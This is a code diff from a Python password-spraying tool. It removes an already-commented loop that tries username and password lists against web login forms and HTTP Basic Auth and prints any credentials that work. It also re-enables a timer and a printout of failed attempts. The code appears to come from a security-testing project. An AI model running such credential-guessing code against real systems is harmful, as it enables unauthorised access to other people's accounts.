@@ -601,7 +601,7 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     pages_to_check = list(set(pages_to_check))  # Remove duplicates
 
     
-    #start_timer()
+    start_timer()
     log_resource_usage("Initial Connection","")
     t = []
     total_pages_field = 0 # stores the total number of pages that have any authentication fields
@@ -622,76 +622,12 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     if ask_for_bruteforce():
         perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
     """
-        # Check if the page has a password field (form-based authentication)
-        if is_password_requested_basic_password_field(full_url, session):
-            total_pages_field +=1
-            for password in passwords:
-                for username in usernames:
-                    try:
-                        # print(f"{Fore.WHITE}Trying username: {username} and password: {password}") // Can be useful when debugging
-                        credentials = attempt_login_with_form(full_url, session, username, password)
-                        total_attempts = total_attempts+1
-
-                        if credentials:
-                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
-                            successful_attempts = successful_attempts +1
-                            successful_cracks.append((full_url, credentials[0], credentials[1]))
-                            break
-                        else:
-                            failed_cracks.append((full_url, username, password))
-                    except (Timeout, ConnectionError):
-                        print(f"{Fore.RED}Connection failed for {full_url}")
-                        time.sleep(1)
-                    except RequestException as e:
-                        print(f"{Fore.RED}An error occurred: {e}")
-                        time.sleep(1)
-                    #time.sleep(1)
-
-        if is_password_requested_basic_auth(full_url, session):
-            start_timer()
-            total_pages_field +=1
-            for password in passwords:
-                for username in usernames:
-                    try:
-                        # print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}") // Can be useful when debugging
-                        response = session.get(full_url, auth=HTTPBasicAuth(username, password))
-                        total_attempts = total_attempts+1
-                        if response.status_code == 200:
-                            print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
-                            successful_cracks.append((full_url, username, password))
-                            successful_attempts = successful_attempts +1
-                            break
-                        else:
-                            '''
-                            # Print a more detailed error reason based on the response code
-                            if response.status_code == 401:
-                                print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
-                            elif response.status_code == 403:
-                                print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
-                            else:
-                                print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}") #// Can be useful when debugging
-                            '''
-                            failed_cracks.append((full_url, username, password))
-
-                    except (Timeout, ConnectionError):
-                        print(f"{Fore.RED}Connection failed for {full_url}")
-                        time.sleep(1)
-                    except RequestException as e:
-                        print(f"{Fore.RED}An error occurred: {e}")
-                        time.sleep(1)
-            duration = end_timer()
-    # duration = end_timer()
-            
-    # After exhausting all combinations, ask if the user wants to proceed with bruteforce
-    #if ask_for_bruteforce():
-        #perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
-
-    '''
+  
     if failed_cracks:
         print(f"{Fore.RED}Failed pages that required a password:")
         for page, user, pwd in failed_cracks:
             print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
-    '''
+
     if failed_cracks: ### if uncommenting the code above when debugging, make sure to comment this if statement (not the else)
         pass
     else:
